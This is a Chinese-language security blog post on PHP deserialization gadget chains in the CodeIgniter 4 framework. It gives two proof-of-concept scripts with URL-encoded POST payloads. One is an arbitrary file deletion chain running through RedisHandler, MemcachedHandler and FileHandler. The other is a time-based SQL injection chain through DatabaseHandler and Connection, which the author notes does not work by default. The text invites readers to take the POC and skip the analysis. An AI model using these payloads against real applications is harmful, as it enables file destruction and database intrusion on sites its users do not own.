## 0x01 背景介绍
之前看了一篇文章是将CodeIgniter反序列化调用链的。原文：https://www.freebuf.com/vuls/269597.html。

文章作者提出了一条反序列化的调用链，大体的意思就是通过反序列化，利用恶意的MYSQL服务器来读取服务器文件的效果。这条利用链要求php7.2的环境，其他都不行。要求不可谓不苛刻。
或许有小伙伴会问，这调利用链前面不是可以构造SQL语句执行吗？为什么不进行SQL注入呢？答案是，这条利用链里面连接的数据库是自己远程的MYSQL，难道自己注自己吗？
我的目标是找出新的反序列化利用链？可用性要更好的？

## 0x02 任意文件删除的反序列化利用链
先直接上POC，如果不想看分析的拿着POC就可以走了。
```<?php

namespace CodeIgniter\Cache\Handlers;

class RedisHandler {
	public $redis;
	function __construct($redis){
		$this->redis = $redis;
	}
}

namespace CodeIgniter\Session\Handlers;
class MemcachedHandler {
	public $memcached;
	public $lockKey;
	function __construct($memcached){
		$this->memcached = $memcached;
		$this->lockKey = "111.txt";
	}
}

namespace CodeIgniter\Cache\Handlers;

class FileHandler{
	public $prefix;
	public $path;
	function __construct(){
		$this->prefix = "";
		$this->path = "E:/test/test/";
	}
}

$a = serialize(new \CodeIgniter\Cache\Handlers\RedisHandler(new \CodeIgniter\Session\Handlers\MemcachedHandler(new \CodeIgniter\Cache\Handlers\FileHandler())));
echo $a;
echo "<hr>";
echo urlencode($a);
```
这条链子比较短，里面只涉及到三个类的调用。
第一个是/system/Cache/Handlers/RedisHandler.php类的__destruct方法，$this->redis未经合适的验证，直接调用了close方法
```	public function __destruct()
	{
		if ($this->redis) // @phpstan-ignore-line
		{
			$this->redis->close(); //$this->redis未经合适的验证，直接调用了close方法
		}
	}
```
第二个是/system/Session/Handlers/MemcachedHandler.php类中的close方法，$this->memcached未经过合适的验证，直接调用了delete方法
```	public function close(): bool
	{
		if (isset($this->memcached))
		{
			isset($this->lockKey) && $this->memcached->delete($this->lockKey);

			if (! $this->memcached->quit())
			{
				return false;
			}

			$this->memcached = null;

			return true;
		}

		return false;
	}
```
第三个是/system/Cache/Handlers/FileHandler.php类中的delete方法，这里面直接进行了unlink操作，且参数$key来源于上一个类中的$this->lockKey。
```	public function delete(string $key)
	{
		$key = $this->prefix . $key;

		return is_file($this->path . $key) && unlink($this->path . $key);
	}
```
这就是一个完整的任意文件删除的反序列化利用链了。下面来利用这个触发点。
1）增加一个控制器的入口函数，里面包含了反序列化的操作。
![blockchain](https://github.com/pang0lin/auto-unsearalize/blob/main/imgs/CI_1.png "CodeIgniter unserialize chain")
2）放置E:/test/test/111.txt文件，等待删除。这里也可以用相对路径删除CI自己的文件。
![blockchain](https://github.com/pang0lin/auto-unsearalize/blob/main/imgs/CI_2.png "CodeIgniter unserialize chain")
3）运行上面的POC，得到反序列化数据。传递参数。
```
http://localhost/codeigniter4/public/index.php/home/test

POST：a=O%3A39%3A%22CodeIgniter%5CCache%5CHandlers%5CRedisHandler%22%3A1%3A%7Bs%3A5%3A%22redis%22%3BO%3A45%3A%22CodeIgniter%5CSession%5CHandlers%5CMemcachedHandler%22%3A2%3A%7Bs%3A9%3A%22memcached%22%3BO%3A38%3A%22CodeIgniter%5CCache%5CHandlers%5CFileHandler%22%3A2%3A%7Bs%3A6%3A%22prefix%22%3Bs%3A0%3A%22%22%3Bs%3A4%3A%22path%22%3Bs%3A13%3A%22E%3A%2Ftest%2Ftest%2F%22%3B%7Ds%3A7%3A%22lockKey%22%3Bs%3A7%3A%22111.txt%22%3B%7D%7D
```

![blockchain](https://github.com/pang0lin/auto-unsearalize/blob/main/imgs/CI_3.png "CodeIgniter unserialize chain")
4）运行时会报错，这很正常，因为前面有一步会调用一个quit方法，但是我们后面的类没有这个方法。但是不影响我们任意文件删除操作的执行。
![blockchain](https://github.com/pang0lin/auto-unsearalize/blob/main/imgs/CI_4.png "CodeIgniter unserialize chain")


## 0x03 SQL注入的反序列化利用链
这条利用链有一些问题，默认情况下CI的类里面不会自动加载配置文件，导致我们不能直接利用这条链来进行SQL注入，仅作学习使用。
先直接上POC。
```<?php

namespace CodeIgniter\Cache\Handlers;

class RedisHandler {
	public $redis;
	function __construct($redis){
		$this->redis = $redis;
	}
}


namespace CodeIgniter\Session\Handlers;
class DatabaseHandler {
	public $lock;
	public $platform;
	public $db;

	function __construct($db){
		$this->lock = "xxx') and sleep(5) -- a";
		$this->platform = "mysql";
		$this->db = $db;
	}
}

namespace CodeIgniter\Database\MySQLi;
class Connection {
	public $queryClass;
	public $connID;
	public $pretend;
	public $swapPre;
	function __construct(){
		$this->queryClass = "\CodeIgniter\Database\Query";
		$this->connID = "xxx";
		$this->pretend = false;
		$this->swapPre = [];
	}
}

$a = serialize(new \CodeIgniter\Cache\Handlers\RedisHandler(new \CodeIgniter\Session\Handlers\DatabaseHandler(new \CodeIgniter\Database\MySQLi\Connection())));
echo $a;
echo "<hr>";
echo urlencode($a);
```
前面的调用链部分还是和上面的任意文件删除的反序列化调用链相似。
第一个是/system/Cache/Handlers/RedisHandler.php类的__destruct方法，$this->redis未经合适的验证，直接调用了close方法
```	public function __destruct()
	{
		if ($this->redis) // @phpstan-ignore-line
		{
			$this->redis->close(); //$this->redis未经合适的验证，直接调用了close方法
		}
	}
```
第二个是\system\Session\Handlers\DatabaseHandler.php类中的close方法，调用了本来的releaseLock方法。
```	public function close(): bool
	{
		return ($this->lock && ! $this->releaseLock()) ? $this->fail() : true;
	}
```
继续跟踪releaseLock方法，这里的$this->db未经验证的调用了query方法。
```	protected function releaseLock(): bool
	{
		if (! $this->lock)
		{
			return true;
		}

		if ($this->platform === 'mysql')
		{
			if ($this->db->query("SELECT RELEASE_LOCK('{$this->lock}') AS ci_session_lock")->getRow()->ci_session_lock)
			{
				$this->lock = false;
				return true;
			}

			return $this->fail();
		}

		if ($this->platform === 'postgre')
		{
			if ($this->db->simpleQuery("SELECT pg_advisory_unlock({$this->lock})"))
			{
				$this->lock = false;
				return true;
			}

			return $this->fail();
		}

		// Unsupported DB? Let the parent handle the simple version.
		return parent::releaseLock();
	}
```
第三个是\system\Database\BaseConnection.php类中的query方法。由于$this->queryClass可控，查看哪个类实现了setQuery和getQuery方法。最后找到的是\CodeIgniter\Database\Query类。
```	public function query(string $sql, $binds = null, bool $setEscapeFlags = true, string $queryClass = '')
	{
		$queryClass = $queryClass ?: $this->queryClass; //可控点

		if (empty($this->connID))
		{
			$this->initialize();
		}

		$resultClass = str_replace('Connection', 'Result', get_class($this));
		/**
		 * @var Query $query
		 */
		$query = new $queryClass($this);

		$query->setQuery($sql, $binds, $setEscapeFlags);

		if (! empty($this->swapPre) && ! empty($this->DBPrefix))
		{
			$query->swapPrefix($this->DBPrefix, $this->swapPre);
		}

		$startTime = microtime(true);

		// Always save the last query so we can use
		// the getLastQuery() method.
		$this->lastQuery = $query;
		

		// Run the query for real
		if (! $this->pretend && false === ($this->resultID = $this->simpleQuery($query->getQuery()))) //这里是继续点
		{
			$query->setDuration($startTime, $startTime);

			// This will trigger a rollback if transactions are being used
			if ($this->transDepth !== 0)
			{
				$this->transStatus = false;
			}
```
这里调用了本类的simleQuery方法。里面调用了execute来执行SQL。
```	public function simpleQuery(string $sql)
	{
		if (empty($this->connID))
		{
			$this->initialize();
		}

		return $this->execute($sql); //这里就是调用了execute执行sql的位置
	}
```
为了调试，我们在execute函数的定义位置下调试断点。简单来看也可以这样输出sql.
![blockchain](https://github.com/pang0lin/auto-unsearalize/blob/main/imgs/CI_5.png "CodeIgniter unserialize chain")


```POST: /反序列化的点

a=O%3A39%3A%22CodeIgniter%5CCache%5CHandlers%5CRedisHandler%22%3A1%3A%7Bs%3A5%3A%22redis%22%3BO%3A44%3A%22CodeIgniter%5CSession%5CHandlers%5CDatabaseHandler%22%3A3%3A%7Bs%3A4%3A%22lock%22%3Bs%3A23%3A%22xxx%27%29+and+sleep%285%29+--+a%22%3Bs%3A8%3A%22platform%22%3Bs%3A5%3A%22mysql%22%3Bs%3A2%3A%22db%22%3BO%3A38%3A%22CodeIgniter%5CDatabase%5CMySQLi%5CConnection%22%3A4%3A%7Bs%3A10%3A%22queryClass%22%3Bs%3A27%3A%22%5CCodeIgniter%5CDatabase%5CQuery%22%3Bs%3A6%3A%22connID%22%3Bs%3A3%3A%22xxx%22%3Bs%3A7%3A%22pretend%22%3Bb%3A0%3Bs%3A7%3A%22swapPre%22%3Ba%3A0%3A%7B%7D%7D%7D%7D
```
![blockchain](https://github.com/pang0lin/auto-unsearalize/blob/main/imgs/CI_6.png "CodeIgniter unserialize chain")

这里面最大的问题就是$this->connID = "xxx";这个赋值上面，这个connID明显不是一个有效的数据库连接，所以正常的SQL就是执行不了了。如果要利用只能参考作者https://www.freebuf.com/vuls/269597.html
的利用方式。
